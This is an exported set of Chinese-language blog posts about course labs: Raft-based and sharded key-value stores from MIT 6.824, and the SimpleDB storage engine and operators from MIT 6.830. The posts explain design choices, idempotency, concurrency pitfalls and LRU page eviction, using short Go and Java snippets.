<li> 100 一直干巴巴地等着数据删除的请求，但那永远不会到来了...</li>
</ul>
<h3 id="challenge-2-不阻塞其他切片数据请求">challenge 2
不阻塞其他切片数据请求</h3>
<p>要求即使在配置更新中，如果请求的数据不处于切片迁移中，应该正常处理，不能阻塞。</p>
<p>这就需要我们检查单个切片的迁移状态，且 apply 配置更新时不能阻塞 applier 线程。我这里使用了一个 <code>inMigration
map[int]bool</code>，记录哪些切片是还没有拉取到的，该字段同样需要存储在快照中。</p>
<ol type="1">
<li>在配置更新开始的时候，根据 <code>prevConfig,cuurentConfig</code> 计算 <code>inMigration</code></li>
<li>apply 一条 Insert
ShardOp，<strong>如果在 <code>inMigration</code> 中，应用 op 且从 <code>inMigration</code> 中删除</strong></li>
<li>用户请求到来时，根据 <code>inMigration</code> 判断是否阻塞</li>
</ol>
<p>究其原因是，不能在 Insert
ShardOp 更新 <code>prevConfig</code> 后，就缺少了实时反映数据同步进度的状态，就有了 <code>inMigration</code>。</p>
<h3 id="challenge-2-快速响应">challenge 2 快速响应</h3>
<p>要求在配置更新中，在收到部分 shard 数据后，应该立刻开始处理请求，不能等到配置更新结束再处理。在测试代码中，可以看到，持有旧切片的复制组直接下线了，这种情况下配置更新永远无法完成，没有快速响应，系统就永远无法处理用户请求。</p>
<p>这里需要注意的就是上面高亮的步骤 2，需要加幂等性校验。因为可能 server 执行了一些这个切片的数据更新后，在配置更新中下线了，之后重启，由重新拉取了一份旧数据，如果直接覆盖，就会导致更新丢失。</p>
<h2 id="总结">总结</h2>
<p>这门分布式系统的课程，一路学来、做实验，让我收获很多。在不可靠的网络中（分区、丢失、乱序），能够实现一个分区容错、强一致的分布式系统，还是很有成功感的。</p>
<p>由于时间限制，这篇博客没有写的很详细，但还是希望这篇博客能帮到你，有问题也可以评论交流～</p>
]]></content>
      <categories>
        <category>MIT 6.824</category>
      </categories>
      <tags>
        <tag>MIT 6.824</tag>
        <tag>分布式系统</tag>
        <tag>Raft</tag>
        <tag>KV</tag>
        <tag>切片</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT-6.824 Lab3: 基于 Raft 的 KV 数据库</title>
    <url>/blog/2023/07/29/MIT-6-824-3/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 MIT
6.824 的 lab3，基于之前构建的 Raft 层的容错、线性一致性的能力，实现一个 KV 数据库。</p>
<span id="more"></span>
<p>遵循课程规定，本文没有放出核心代码，只介绍了一些结构设计和流程思考，可放心食用。</p>
<h2 id="整体架构">整体架构</h2>
<p>KV 数据库是典型的客户端 - 服务端架构，结构图如下（来自官网）：</p>
<p><img src="kvraft_diagram.png"></p>
<ul>
<li>客户端：GET/PUT/APPEND
请求的发起者，期望得到一个<strong>线性一致的结果</strong></li>
<li>服务端：基于 Raft 的分布式存储，屏蔽了内部细节，对外表现的像是一个<strong>可靠的单机存储</strong></li>
</ul>
<p>这里的线性一致是指，多个客户端发起请求时，某个客户端得到的结果，对其他客户端是立刻可见的。比如客户端 A 发起了
<code>put x
1</code>，只要它得到了正确处理的结果，任何其他客户端发起 <code>get
x</code> 得到的一定是 1。这是通俗一点的解释方法。来自维基百科的，更学术一点的定义：</p>
<blockquote>
<p>In <a href="https://en.wikipedia.org/wiki/Concurrent_programming">concurrent
programming</a>, an operation (or set of operations) is
<strong>linearizable</strong> if it consists of an ordered list of <a href="https://en.wikipedia.org/wiki/Execution_(computing)">invocation</a>
and response <a href="https://en.wikipedia.org/wiki/Event_(computing)">events</a>, that
may be extended by adding response events such that:</p>
<ol type="1">
<li>The extended list can be re-expressed as a sequential history (is <a href="https://en.wikipedia.org/wiki/Serializability">serializable</a>).</li>
<li>That sequential history is a subset of the original unextended
list.</li>
</ol>
</blockquote>
<p>也可以参考<a href="https://segmentfault.com/a/1190000022248118">分布式 -
共识、线性一致性与顺序一致性 - 叽叽喳喳 - SegmentFault 思否</a>。</p>
<p>二者之前的通信基于 RPC：</p>
<ul>
<li>客户端 API：GET/PUT/APPEND
方法，反复重试<strong>直到找到对应的服务端 leader 节点</strong>，发起请求</li>
<li>服务端逻辑：如果不是 leader，返回报错，否则<strong>阻塞到请求成功执行，返回执行结果</strong></li>
</ul>
<h3 id="需要考虑的问题">需要考虑的问题</h3>
<p><strong>重复请求的幂等性</strong>：由于网络不稳定，可能会有应用层的重发，客户端需要给请求带唯一 id，服务端需要做幂等处理</p>
<ul>
<li>注意，这个要和 TCP 的 “不重不漏” 区分开。假设传输层使用 TCP 协议，也只能保证应用层的报文被正常接收（应答方返回 ACK），并不能对应用层的逻辑作任何保证，必须得收到应用层的响应才能认为请求得到处理，收不到就需要重发。</li>
</ul>
<h2 id="客户端">客户端</h2>
<p>客户端的逻辑比较清晰，需要缓存一个 <code>leaderId</code> 记录上次成功处理请求的 server，避免每次都要轮询所有 server。为了支持幂等性，需要有客户端 id、序列号 id 两个字段，唯一标识一个客户端请求。对应地、服务端需要保存<strong>每个客户端处理过的最大请求 id</strong>，在处理前先确认没有处理过，进而实现幂等性。</p>
<p>在这种场景下，要求每个客户端只能<strong>以单线程地阻塞发起请求</strong>，才可以保证幂等性。反之，如果客户端 0 同时发起了 1、2 两个请求，2 被正确处理了，1 丢失没有到达 server。等 1 的重传报文到达 server，server 发现处理完的最大请求 id 是 2&gt;1，进而拒绝处理，就出问题了。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Clerk <span class="keyword">struct</span> {</span><br><span class="line"> servers []*labrpc.ClientEnd</span><br><span class="line"> <span class="comment">// You will have to modify this struct.</span></span><br><span class="line"> leaderId <span class="keyword">int</span>   <span class="comment">// leader id (client 的角度)</span></span><br><span class="line"> id       <span class="keyword">int64</span> <span class="comment">// clerk uuid</span></span><br><span class="line"> seqId    <span class="keyword">int64</span> <span class="comment">// 从 1 开始自增的请求Id</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这里需要注意的一点是，客户端和服务端的角度来看<strong>，<code>servers</code> 的顺序是不一致的</strong>。我最开始想做的一个优化是，server 在收到请求，发现自己不是 leader 之后，把正确 server 的 id 发给客户端，客户端直接向对应的 id 发请求，不必轮询所有 server，实际运行的时候却出现了问题。观察代码可以发现，测试中新建客户端时，做了乱序处理：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">ck := MakeClerk(random_handles(ends))</span><br></pre></td></tr></tbody></table></figure>
<p>这样的设计进一步解耦了 client 和 server，在真实系统里，client 和 server 的访问策略和机制可能是不一致的，两者间不应该产生依赖。</p>
<p>这里有个坑点是，key 不存在的时候，client 应该返回空字符串，我最开始返回了 <code>ErrNoKey</code>，报了奇怪的线性不一致问题，对着 procupine 的图反复研究，有点乐。</p>
<h2 id="服务端">服务端</h2>
<h3 id="结构">结构</h3>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> KVServer <span class="keyword">struct</span> {</span><br><span class="line"> deadlock.Mutex</span><br><span class="line"> me      <span class="keyword">int</span></span><br><span class="line"> rf      *raft.Raft</span><br><span class="line"> applyCh <span class="keyword">chan</span> raft.ApplyMsg</span><br><span class="line"> dead    <span class="keyword">int32</span> <span class="comment">// set by Kill()</span></span><br><span class="line"></span><br><span class="line"> maxraftstate <span class="keyword">int</span> <span class="comment">// snapshot if log grows this big</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Your definitions here.</span></span><br><span class="line"> <span class="comment">// kv</span></span><br><span class="line"> maxRaftSize <span class="keyword">int</span>               <span class="comment">// Raft 最大状态</span></span><br><span class="line"> db          <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span> <span class="comment">// 数据存储</span></span><br><span class="line"> seen        <span class="keyword">map</span>[<span class="keyword">int64</span>]<span class="keyword">int64</span>   <span class="comment">// client对应的max Seq</span></span><br><span class="line"> <span class="comment">// 维护提交状态</span></span><br><span class="line"> lastApplied <span class="keyword">int</span>            <span class="comment">// 最后提交的 log id</span></span><br><span class="line"> applyCond   *deadlock.Cond <span class="comment">// apply 条件</span></span><br><span class="line"> <span class="comment">// persistence</span></span><br><span class="line"> persister *raft.Persister</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>服务端的逻辑如下，当接收到一个 PUT/GET/APPEND 请求：</p>
<ol type="1">
<li>判断自己是否是 leader，若否，返回错误</li>
<li>将请求提交给 raft</li>
<li> 等待 raft 将请求提交至应用层，执行完毕 /
<strong>raft 的 leader 情况发生变化</strong></li>
<li>返回结果</li>
</ol>
<h3 id="处理raft-leader变化">处理 raft leader 变化</h3>
<p>需要注意的是，在等待 raft 提交请求的过程中，可能会 leader 情况发生变化，这种情况要返回错误。处理不当可能会有问题。例如，我最初是这样等待请求处理完毕的：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">index, _, isLeader := kv.rf.Start(op)</span><br><span class="line"><span class="keyword">for</span> isLeader &amp;&amp; kv.lastApplied &lt; index {</span><br><span class="line">    kv.applyCond.Wait()</span><br><span class="line">}</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></tbody></table></figure>
<p>这样没有处理 leader 变化的情况，指导书里提到可以这样处理，当节点检查到一个不同的请求已经出现在 Start 返回的 <code>index</code> 位置，即比较两个的请求内容是否相同，若不同，则说明其他节点成为了 leader，同步了不一样的日志过来。</p>
<p>我觉得这种做法可以改进，这种做法需要等待：</p>
<ol type="1">
<li>当前节点收到更大的 term，变为 follower</li>
<li> 当前节点收到 leader 的 index 日志</li>
<li>当前节点提交 index 日志至应用层</li>
</ol>
<p>之后，才会意识到自己不是 leader 了。但实际上，早在第一步就可以发现错误了。可以当 Raft 的 leader 状态发生变化时，提交一条特殊的日志到应用层，触发检查，即可及早返回错误。</p>
<h3 id="幂等性">幂等性</h3>
<p>当 server 处理请求之前，需要先判断 seqId 是否大于已处理同一 client 的最大 seqId：</p>
<ul>
<li>若是，则处理请求，更新最大 id</li>
<li> 若否，丢弃请求</li>
</ul>
<h3 id="快照">快照</h3>
<p>在 lab
2 中，raft 层实现了快照功能，本次需要在应用层对 raft 的状态进行判断，即将到达要求时，在应用层生成快照，并提交给 raft 处理。需要考虑是快照里要包含哪些信息：</p>
<ul>
<li>数据库的键值对，这个是毋庸置疑的</li>
<li>每个 client 已处理的最大请求 Id，避免重启后处理重复消息</li>
</ul>
<h2 id="一些问题">一些问题</h2>
<h3 id="operations-completed-too-slowly">Operations completed too
slowly</h3>
<p>lab3 测试中可能会出现这个错，一般原因是，在 Start 中没有立刻同步日志，只有被动地依赖 Raft 心跳进行传输，使得操作处理速率受限于心跳频率。解决方法当然是，在 Start 后立刻<strong>异步</strong>同步日志。</p>
<p>细心的你会发现，Start 和心跳可能会同时同步日志，那么会不会有什么问题呢？当然是有的！问题表现的<strong>像是收到了乱序的网络回复</strong>。我们知道，<code>AppendEntries</code> 调用可能会有以下两种结果：</p>
<ul>
<li>失败，<code>leader</code> 降低 <code>nextIndex</code> 重试，可能发起 <code>InstallSnapshot</code></li>
<li>成功，<code>leader</code> 调高 <code>nextIndex, matchIndex</code></li>
</ul>
<p>假设出现了这样的执行顺序：</p>
<ol type="1">
<li>心跳线程，发起 <code>AppendEntries</code></li>
<li>Start 发起 <code>AppendEntries</code></li>
<li>心跳线程，失败，降低 <code>nextIndex</code></li>
<li>心跳线程，<code>InstallSnapshot</code> 成功，增大 <code>nextIndex &gt;
lastIncludedIndex</code></li>
<li>Start 收到结果，失败，降低 <code>nextIndex</code></li>
<li>心跳线程，<code>InstallSnapshot</code> 成功后尝试同步快照后的日志，期望 <code>nextIndex
&gt; lastIncludedIndex</code>，<strong>发现不符合，出错</strong></li>
</ol>
<p>当然，这个问题跟具体实现有关，我的实现中，失败后会依次完成 <code>InstallSnapshot</code>，成功后继续 <code>AppendEntries</code>，由于发起 RPC 过程中释放了锁，导致其他线程修改了 <code>nextIndex</code>，进而出错。</p>
<p>解决方法是，进行兼容处理，所有的，由于 RPC 中途释放的过程，形如：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">rf.Lock()</span><br><span class="line">v:=rf.nextIndex</span><br><span class="line">rf.Unlock()</span><br><span class="line">server.Call()</span><br><span class="line">rf.Lock()</span><br><span class="line"><span class="comment">// should use v rather than rf.nextIndex</span></span><br><span class="line"><span class="comment">// should check v==rf.nextIndex</span></span><br><span class="line">rf.Unlock()</span><br></pre></td></tr></tbody></table></figure>
<p>在第一次加锁中，需要读取共享变量的值，第二次加锁时，需要选择：</p>
<ul>
<li>使用第一次读到的值，不要读新值，更新时要兼容更新（例如取 max）</li>
<li>检查新值旧值是否相同，再决定要不要进行剩下的逻辑</li>
</ul>
<p>具体选哪种要看操作类型，比如我上面举的例子，当应该判断新的 <code>nextIndex</code> 是否合法，不合法就退出执行。</p>
<p>此外，在接收端，即处理 <code>AppendEntries</code>，<code>InstallSnapshot</code> 时，也需要做乱序请求的兼容，不过由于处理时基本一直加锁，只需在处理前判断即可。</p>
<h3 id="心跳可以不传数据吗">心跳可以不传数据吗</h3>
<p>我不建议这样做。Start 只有在应用层新增请求的时候会使用。如果心跳不传数据，可能会导致日志同步过慢。例如 leader 收到新日志 1 后，还没同步到过半节点，宕机了。新 leader 上线后，由于应用层迟迟没有新请求到来，日志 1 迟迟得不到同步，也不好。如果心跳也可以同步日志，就可以保证了一个最低同步时延。</p>
<h3 id="start怎么同步日志">Start 怎么同步日志</h3>
<p>我建议不要每次都起 goroutine，而是为每个 peer 维护一个后台同步线程，Start 只是唤醒这个线程执行。虽然 goroutine 创建和销毁的开销不大，但是，频繁 Start 场景下，每次 Start 都会开启 n 个 goroutine，这：</p>
<ul>
<li>不必要：如果前一个日志同步没有得到响应（可能节点下线），发起新的同步意义不大</li>
<li>存在重复传输：前一个日志同步没有得到响应，每次新的同步都会带有 <code>nextIndex</code> 之后的全量日志，有很多是重复的</li>
<li>存在锁的争用和潜在的并发问题</li>
</ul>
<h2 id="总结">总结</h2>
<p>本次 lab 整体不难，就是可能 Raft 有些问题，需要再返回去排查改错。如果 Raft 模块设计的不好，再回过头改动会很痛苦。</p>
]]></content>
      <categories>
        <category>MIT 6.824</category>
      </categories>
      <tags>
        <tag>MIT 6.824</tag>
        <tag>分布式系统</tag>
        <tag>Raft</tag>
        <tag>KV</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 1 实验报告</title>
    <url>/blog/2022/11/16/MIT-6-830-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>最近开始学数据库了，找到了 MIT
6.830 的 Lab，感觉质量还挺高的。打算从实现上了解下数据库的细节。MIT
6.830 的实验要求使用 JAVA 语言实现一个简易的关系数据库，支持常用的增删改查操作、事务、B + 树索引、恢复等功能。这次我分享下 Lab
1 的一些总结。我把课程资料也附在了后面，有兴趣一起学习的一起来学习讨论～
<span id="more"></span></p>
<h2 id="整体架构">整体架构</h2>
<p>代码主要分为以下几个目录：</p>
<ul>
<li>common:
定义公用的类：Database、Catalog，其中 Database 提供了静态方法访问 Bufferpool、Catalog 的单例</li>
<li> execution:
定义了数据库操作符的 <code>OpItertor</code> 接口，支持 scan、filter、aggregate、join 等操作</li>
<li> index: B + 树索引</li>
<li> optimizer: 查询优化</li>
<li> storage:
数据库的存储，定义了 Tuple、Record、Field 等基础概念类，以及 Heap
File 存储</li>
<li> transaction: 事务</li>
</ul>
<p>后面的 6 个 lab 会逐渐地实现这些功能，在第一个 lab，只需要实现一些存储逻辑。</p>
<h2 id="exercises">Exercises</h2>
<h3 id="field-tuple">Field &amp; Tuple</h3>
<p>这部分要求实现基础的 Field、Tuple 类的功能，具体包含 <code>TupleDesc</code> 和 <code>Tuple</code> 两个类。</p>
<p>先介绍一下 <code>Field</code>，SimpleDB 支持两种数据类型：整数与定长字符串，两种类型定义在枚举类 <code>Type</code> 中，对应的 <code>IntField</code> 和 <code>StringField</code> 实现了 <code>Field</code> 接口，可以同种 Field 相互比较。仅有定长类型简化了数据库模型。</p>
<p><code>TupleDesc</code> 是每个数据库表的元组描述，包含若干个字段，简单来说，就是一个 (Type,
Name) 的数组，记录了每个字段的类型和可为字段的域名。这个类中主要要实现构造函数和一些 <code>get</code> 方法，比较简单。值得注意的是这里要实现一个静态的 <code>Merge</code> 方法，用于将两个 <code>TupleDesc</code> 对象合并，在后面的 <code>join</code> 操作时会用到。</p>
<p><code>Tuple</code> 是一条元组，由一个 <code>TupleDesc</code> 构造而成，包含了一个 <code>Field</code> 的数组存储各个字段的值。其中，每个 <code>Tuple</code> 关联一个 <code>RecordId</code>，为该元组在表的索引 id，由页号 + 页内偏移完成，这里只需要实现 get、set 方法，recordId 后面会用到。</p>
<h3 id="catalog">Catalog</h3>
<p><code>Catalog</code> 用于追踪数据库中的所有表，提供了方法用于新建和删除表。正常来说，<code>Catalog</code> 应该从磁盘加载，但是在这个 lab 不需要考虑序列化和加载的逻辑，只需要实现启动后的数据库表的管理逻辑。每个数据库表包含以下几个信息：</p>
<ul>
<li>表名：一个字符串</li>
<li>文件：一个实现了 <code>DbFile</code> 的文件对象</li>
<li>表的 id：由文件对象唯一对应，一般是绝对路径的 <code>hashcode</code></li>
<li>主键：一个字符串，SimpleDB 只考虑单一主键</li>
<li>元组描述，一个 <code>TupleDesc</code> 对象</li>
</ul>
<p><code>Catalog</code> 类还提供了一个已经实现的 <code>loadSchema</code> 方法，用于从文件中读取数据库的模式并新建表。</p>
<h3 id="bufferpool">BufferPool</h3>
<p><code>BufferPool</code> 类定义了一个统一的、具有缓存的页面读取方法。一般来说，操作一个页面需要先将其从磁盘加载到内存中，然后才能操作。<code>BufferPool</code> 定义了一个缓存区，当页面已经被加载到内存后，就无需再次加载了。这里后续需要实现一个类似 LRU 的页面调度算法，在本次 lab 中尚不需要。</p>
<p>本 lab 中，BufferPool 需要实现一个 get 页面的方法，当缓存区满时，只需要抛出 <code>DbException</code> 异常即可。这里需要根据 <code>PageId</code> 获取 table
id，进而通过 Catalog 获取表进而读取。</p>
<h3 id="heappage">HeapPage</h3>
<p>这个 Exercise 要实现 HeapFile 的读取方法，包含 <code>HeapPage, HeapPageId,
RecordId</code> 三个类。其中，<code>RecordId</code> 类的功能已经在上面介绍，是每个元组在表中的唯一的记录 id，包含 <code>PageId</code> 和在页内的编号。<code>HeapPageId</code> 实现了 <code>PageId</code> 接口，包含一个表 id 以及页面号，与 <code>RecordId</code> 类似。这两个类都比较简单，只需要实现一些 get、equals,
hashcode 方法即可。</p>
<p><code>HeapPage</code> 是 <code>HeapFile</code> 的页面类，实现了 <code>Page</code> 接口，需要支持获取页面数据、脏位标记等功能。这里先简单介绍下 <code>HeapFile</code>，这是一种无序的存储格式，记录以乱序的方式存储在页面中。每个页面由若干个插槽（slot）组成，每个 slot 可用于存储一条记录，页面首部包含一个 bitmap 记录每个 slot 是否包含记录。在插入记录的时候，找到一个空的插槽插入即可。</p>
<p>对于定长记录的表，这里就已经很圆满了。而对于非定长的表，页面内的 slot 数量是可变的，slot 的大小也是可变的。这时，需要在页面尾部记录插槽的位置、大小、数量，还要保存已经有的记录的位置和大小。放在尾部，是因为这样可以方便地增长 slot 数量，当尾部和正向的记录重合时，就意味着页面满了。这种页面还需要周期性地重排一下，避免过多的碎片。当然，这些是题外话，SimpleDB 中不需要考虑这种复杂情况。</p>
<p>本次 lab 中，<code>HeapPage</code> 类需要实现查询槽位状态、计算空槽数量等功能，还要实现一个元组的迭代器。在按上面捋顺了 HeapFile 的原理之后，就很简单了。</p>
<h3 id="heapfile">HeapFile</h3>
<p>这个类主要实现两个功能：</p>
<ul>
<li>读取指定页面。值得注意的是，数据库文件可能很大，因此不能直接把整个文件加载到内存中，需要使用支持随机读写的 <code>RandomAccessFile</code>，移动指针到指定页面的位置，再进行读取。</li>
<li>返回一个可以迭代访问数据库所有元组的 <code>DbFileIterator</code>。值得注意的是，这个 <code>DbFileIterator</code> 需要支持重用，因此其不是一个传统的 <code>Iterator</code>，需要额外的代码来实现一个 <code>DbFileIterator</code>。我建议新建一个类继承自 <code>AbstractDbFileIterator</code>，其对接口的逻辑进行了一定简化。更好的方式是实现一个通用的适配器，把传统的 <code>Iterator</code> 转换成需要的格式。</li>
</ul>
<h3 id="seqscan">SeqScan</h3>
<p>最后一个 Exercise，实现表的遍历操作。这里包装一下上面的 <code>HeapFile</code> 的 <code>Iterator</code> 逻辑，实现 <code>OpIterator</code> 接口即可。这个新的 <code>OpIterator</code> 也需要支持重用，后面也会比较麻烦。这里还不需要担心，写完，通过单元测试就收工啦！</p>
<h2 id="总结">总结</h2>
<p>这个 lab 主要是先熟悉了数据库的整体架构以及相互间的关联。之后，在底层实现 <code>HeapFile</code> 这一经典的文件存储方法，对于页面的读取和元组的存储有了更深的理解。最后，实现了一个数据库的遍历操作，简单了解数据库操作符的规范和接口，剩下的操作符需要在后面实现。</p>
<h2 id="相关链接">相关链接</h2>
<p>我学习的是 2021 年春季的版本，相关链接如下：</p>
<ul>
<li>课程官网: http://db.lcs.mit.edu/6.5830/2021/assign.php,
里面有讲义、PPT，没有视频</li>
<li>代码：https://github.com/MIT-DB-Class/simple-db-hw-2021</li>
</ul>
<h2 id="section"></h2>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 2 实验报告</title>
    <url>/blog/2022/11/20/MIT-6-830-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>书接上回，本次 lab 的实验目标是实现数据库的各种操作符，包含 filter、join、aggregate、insert、delete 等。此外，还需要实现第一节没有实现的页面调度算法，处理 <code>BufferPool</code> 满时的页面调度，此外还有脏页面写回等操作。
<span id="more"></span></p>
<p>下面将按 Exercise 的顺序一个个进行介绍。</p>
<h2 id="exercise">Exercise</h2>
<h3 id="opiterator-operator">OpIterator &amp; Operator</h3>
<p>在实现之前，先介绍下操作符的规范接口。基础接口是 <code>OpIterator</code>，它定义了以下方法，本质上是保存了一张临时的表，可以通过 <code>getTupleDesc()</code> 获取表的描述符，通过反复调用 <code>next()</code> 遍历表的每一行。<code>SeqScan</code> 操作符直接实现了 <code>OpIteraotr</code> 接口，根据表的 id 创建这样的迭代器，作为后续操作符的参数。
</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open</span><span class="params">()</span></span>; <span class="comment">// 开启迭代器</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>; <span class="comment">// 是否有下一个元素</span></span><br><span class="line"><span class="function">Tuple <span class="title">next</span><span class="params">()</span></span>; <span class="comment">// 获取下一个元组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rewind</span><span class="params">()</span></span>; <span class="comment">// 迭代器指针重置</span></span><br><span class="line"><span class="function">TupleDesc <span class="title">getTupleDesc</span><span class="params">()</span></span>; <span class="comment">// 获取表的描述符</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>; <span class="comment">// 关闭迭代器</span></span><br></pre></td></tr></tbody></table></figure>
操作符规范是一个抽象类 <code>Operator</code>，实现了 <code>OpIterator</code> 的 <code>open</code>、<code>close</code>、<code>hasnext</code>、<code>next</code> 方法，避免逻辑冗余。抽象类中包含以下为实现的方法：
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">abstract</span> Tuple <span class="title">fetchNext</span><span class="params">()</span> <span class="comment">// 获取下一个元组，不存在则返回null</span></span></span><br><span class="line"><span class="function">TupleDesc <span class="title">getTupleDesc</span><span class="params">()</span></span>; <span class="comment">// 获取表的描述符</span></span><br><span class="line">OpIterator[] getChildren(); <span class="comment">// 获取操作符的参数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setChildren</span><span class="params">(OpIterator[] children)</span></span>; <span class="comment">// 设置操作符的参数</span></span><br></pre></td></tr></tbody></table></figure>
可以看出，一个操作符持有一个或多个的临时表 <code>OpIterator</code> 参数，本身的 <code>fetchNext</code> 则是用于迭代该操作符的结果。换而言之，<code>Operator</code> 是持有 <code>OpIteraotr[]</code> 的 <code>OpIterator</code>，进而实现了操作符的嵌套，操作符一般只接收一个表参数，除了 <code>join</code>。<p></p>
<h3 id="filter-join">Filter &amp; Join</h3>
<p>首先要实现的是 filter 和 join 操作，均继承实现了 <code>Operator</code> 的抽象类，分别对应 SQL 语法中的 where 从句和 join 从句。filter 操作通过 <code>Predicate</code> 对象去判断每行是否存在于最终的结果中，内部持有一个 <code>OpIteraotr</code> 参数代表要遍历的表。要做的事情也很简单，<code>fetchNext</code> 的时候一直迭代表直到找到一条满足条件的记录，返回即可。</p>
<p>Join 操作与之类似，需要先实现 <code>JoinPredicate</code> 用于匹配一对记录是否存在于最终的结果中，<code>fetchNext</code> 操作则相对复杂。<code>join</code> 遍历的实际是两张表的笛卡尔积，需要内部去维护更新这个笛卡尔积的索引，找到符合条件的一对记录后，还要将它们拼接返回。</p>
<h3 id="aggregate">Aggregate</h3>
<p>在 SimpleDB 中，仅考虑对单个字段分组、聚合。根据聚合字段在类型，可以分为整形聚合和字符串型聚合两类。整形聚合支持 max、min、avg 等数值操作，而字符串型聚合只支持 count 操作。两种聚合分别定义在 <code>IntegerAggregator</code> 和 <code>StringAggregator</code> 操作符中，实现了抽象的 <code>Aggregator</code> 接口（而不是 <code>OpIteraotr</code>），包含以下方法：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeTupleIntoGroup</span><span class="params">(Tuple tup)</span></span>; <span class="comment">// 将新的元组加入到分组结果中</span></span><br><span class="line"><span class="function">OpIterator <span class="title">iterator</span><span class="params">()</span></span>; <span class="comment">// 返回聚合结果的迭代器</span></span><br></pre></td></tr></tbody></table></figure>
<p>可以看到，聚合类是通过 <code>mergeTupleIntoGroup</code> 方法逐条记录地去进行分组，再通过 <code>iterator()</code> 返回结果迭代器，而不是像其他的操作符那样，初始化时就具有表作为输入。我的理解是，由于聚合操作的特点，本身就是要先读取完整个表才能得到分组和聚合结果。如果聚合操作实现操作符接口，也只能是内部再维护一个 <code>OpIterator</code> 结果，所以不如直接解耦这部分逻辑。</p>
<p>两个聚合类的内部实现其实很简单，依赖一个 &lt; GroupValue,
AggregateValue &gt; 的 HashMap，对于新的元组，如果不存在分组值，就新建这个分组。这个 HashMap 可以转换成一个 <code>Iterator&lt;Tuple&gt;</code>，核心问题是怎么把这个转成 <code>OpIterator</code>。因为 Java 自带的 <code>Iterator</code> 和 <code>Stream</code> 均不支持重用，我个人构建了一个 <code>Supplier&lt;Stream&lt;Tuple&gt;&gt;</code>，在每次 rewind 的时候获取一个新的 <code>Iterator&lt;Tuple&gt;</code>，这个 <code>Supplier</code> 再通过一个适配器转换成 <code>OpIterator</code>。</p>
<h3 id="heapfile">HeapFile</h3>
<p>这里需要支持 <code>HeapFile</code> 的修改表操作，即增删元组，需要从 <code>HeapPage,
HeapFile,
BufferPool</code> 三层由底向上地支持增删功能。之前说过，<code>HeapFile</code> 由很多个 <code>HeapPage</code> 组成，通过 <code>BufferPool</code> 统一读取页面进行缓存。在增删元组的时候，<code>HeapFile</code> 需要找到最后一个有空 slot 的页面，插入元组并更新其 RecordId，还需要将页面标记为 “脏” 的，因为页面发生了改变，丢弃前必须写回磁盘。删除元组时，<code>HeapFile</code> 根据其 RecordId 直接定位页面，将对应 slot 标记为空，将页面标记为脏即可。而 <code>HeapPage</code> 则负责在当前页面完成增删。<code>BufferPool</code> 的插入和删除元组操作，则要先通过 <code>Catalog</code> 定位到 <code>HeapFile</code>，在获得修改后脏页面后需要更新缓存中的页面，如果之前没有标记脏位，这里也需要标记。</p>
<p>上面是简单的逻辑介绍，在实现的时候还有些细节可以处理。在插入页面时，找到有空 slot 的页面后，需要具体找到 slot 的位置。由于 bitmap 是以 <code>byte[]</code> 存储的，可以先找到不为 - 1 的 byte，再在 byte 内找到标识位不为 1 的索引。-1 代表着一个全为 1 的有符号数，对于任意长度的有符号数均是如此。因为在负数的补码实现下，最高位的权重是负的，其余位的权重是正的，<span class="math inline">\(-2^n+\sum_{i=0}^{n-1}2^i=-1\)</span>。在插入页面时，若不存在有空 slot 的页面，需要新建页面，完成插入后最好将页面写回文件，不然 <code>numPages()</code> 方法的返回结果会错误。</p>
<h3 id="insert-delete">Insert &amp; delete</h3>
<p>在实现了 <code>HeapFile</code> 的插入删除操作后，这两个操作符也不难了。值得注意的是，这两个操作只需要返回一个整数元组，代表受影响的元组数量。因此 <code>fetchNext</code> 方法只应该返回一个 tuple，之后就返回 null。</p>
<h3 id="page-eviction">Page eviction</h3>
<p>最后，需要完成 <code>BufferPool</code> 的页面调度算法，也就是页面逐出的逻辑。操作系统上的页面调度算法有很多，先进先出，时钟算法，LRU（最近未使用）等。最常用的算法就是 LRU，因为它的性能是最好的。LRU 主要包含两个操作，获取页面和逐出页面。在获取页面时，先判断页面是否在缓存区中，命中则直接返回，未命中则加载至缓存区中。逐出页面时，删除最近最少使用的页面。为了达到<span class="math inline"> \(O(1)\)</span> 的获取页面和逐出页面的复杂度，需要使用一个 HashMap 和一个链表，HashMap 存储链表中的指针，用于查询是否在缓存区中。链表按最近使用的顺序存储页面，在页面使用后或者需要删除时完成高效地移动和删除。具体可以参考 <a href="https://leetcode.cn/problems/lru-cache/">146. LRU 缓存 -
力扣（LeetCode）</a>。</p>
